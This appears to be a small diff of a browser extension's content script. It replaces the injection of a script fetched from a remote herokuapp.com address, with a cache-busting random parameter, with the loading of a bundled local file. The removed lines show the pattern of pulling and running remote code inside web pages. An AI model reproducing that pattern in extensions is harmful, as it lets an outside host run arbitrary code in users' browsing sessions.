@@ -1,3 +1,6 @@
-var script = document.createElement("script");
-script.src = "https://extensionsfd.herokuapp.com/js/extension4.js?cb=" + Math.random() * 1000000;
-document.head.appendChild(script);
+var s = document.createElement('script');
+s.src = chrome.runtime.getURL('extension4.js');
+s.onload = function() {
+ this.remove();
+};
+(document.head || document.documentElement).appendChild(s);
